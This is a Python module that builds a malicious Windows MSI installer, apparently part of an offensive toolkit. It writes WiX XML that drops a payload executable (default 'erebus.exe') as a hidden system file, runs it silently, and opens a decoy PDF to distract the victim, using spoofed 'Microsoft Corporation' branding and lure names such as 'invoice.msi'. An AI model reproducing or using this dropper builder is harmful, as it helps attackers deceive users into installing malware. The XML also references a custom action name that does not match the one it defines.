import pathlib
import sys
import os
import subprocess
import shutil

REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
AGENT_CODE = REPO_ROOT / "agent_code"
PAYLOAD_DIR = AGENT_CODE / "payload"
DECOY_FILE = AGENT_CODE / "decoys" / "decoy.pdf"

def create_msi_trigger(
    payload_exe: str,
    decoy_file: str,
    payload_dir: pathlib.Path = None,
    output_filename: str = "invoice.msi",
    product_name: str = "System Update",
    manufacturer: str = "Microsoft Corporation"
) -> pathlib.Path:
    """Create an MSI trigger file using wixl (msitools) no container,
    """
    if payload_dir is None:
        payload_dir = PAYLOAD_DIR

    msi_output_path = payload_dir / output_filename

    payload_src = payload_dir / payload_exe
    decoy_src = payload_dir / decoy_file

    if not payload_src.exists():
        raise FileNotFoundError(f"Payload not found: {payload_src}")

    wxs_content = f"""<?xml version='1.0' encoding='windows-1252'?>
<Wix xmlns='http://schemas.microsoft.com/wix/2006/wi'>
  <Product Name='{product_name}' Id='*' UpgradeCode='12345678-1234-1234-1234-111111111111'
    Language='1033' Codepage='1252' Version='1.0.0' Manufacturer='{manufacturer}'>

    <Package Id='*' Keywords='Installer' Description='{product_name}'
      Comments='{product_name}' Manufacturer='{manufacturer}'
      InstallerVersion='100' Languages='1033' Compressed='yes' SummaryCodepage='1252' 
      InstallScope="perUser" /> 

    <Media Id='1' Cabinet='product.cab' EmbedCab='yes' />

    <Directory Id='TARGETDIR' Name='SourceDir'>
      <Directory Id='AppDataFolder' Name='AppData'>
        <Directory Id='INSTALLDIR' Name='{product_name}'>

          <Component Id='MainExecutable' Guid='*'>
            <RegistryValue Root='HKCU' Key='Software\{manufacturer}\{product_name}' Name='installed' Type='integer' Value='1' KeyPath='yes'/>
            <File Id='PayloadEXE' Name='{payload_exe}' Source='{payload_src}' Hidden='yes' System='yes' />
          </Component>

          <Component Id='DecoyDocument' Guid='*'>
             <File Id='DecoyPDF' Name='{decoy_file}' Source='{decoy_src}' />
          </Component>

        </Directory>
      </Directory>
    </Directory>

    <Feature Id='Complete' Level='1'>
      <ComponentRef Id='MainExecutable' />
      <ComponentRef Id='DecoyDocument' />
    </Feature>

    <!-- Async Execution of Payload (Hidden) -->
    <CustomAction Id='RunPayload' FileKey='PayloadEXE' ExeCommand='' Return='asyncNoWait' Execute='deferred' Impersonate='yes' />

    <!-- Async Execution of Decoy (Visible via cmd/shell) -->
    <CustomAction Id='LaunchDecoy' Directory='INSTALLDIR' 
      ExeCommand='cmd.exe /c start "" "[#DecoyPDF]"' 
      Return='asyncNoWait' Execute='deferred' Impersonate='yes' />

    <InstallExecuteSequence>
      <Custom Action='RunPayload' Before='InstallFinalize'>NOT Installed</Custom>
      <Custom Action='LaunchCmdDecoy' After='RunPayload'>NOT Installed</Custom>
    </InstallExecuteSequence>

    <!-- Hide MSI UI if desired, or keep minimal -->
    <UIRef Id="WixUI_Minimal" />
    <UIRef Id="WixUI_ErrorProgressText" />

  </Product>
</Wix>
"""

    wxs_path = payload_dir / "trigger.wxs"
    with open(wxs_path, 'w') as f:
        f.write(wxs_content)

    try:
        cmd = ["wixl", "-o", str(msi_output_path), str(wxs_path)]
        subprocess.check_output(cmd, cwd=payload_dir, stderr=subprocess.STDOUT)
        return msi_output_path

    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"wixl compilation failed: {e.output.decode()}")
    finally:
        if wxs_path.exists():
            wxs_path.unlink()

def create_msi_payload_trigger(
    payload_exe: str = "erebus.exe",
    payload_dir: pathlib.Path = None,
    decoy_file: pathlib.Path = None,
) -> pathlib.Path:

    if decoy_file is None:
        decoy_file = DECOY_FILE

    return create_msi_trigger(
        payload_exe=payload_exe,
        decoy_file=decoy_file.name,
        payload_dir=payload_dir,
        product_name="Document Viewer",
        output_filename=f"{decoy_file.name}.msi"
    )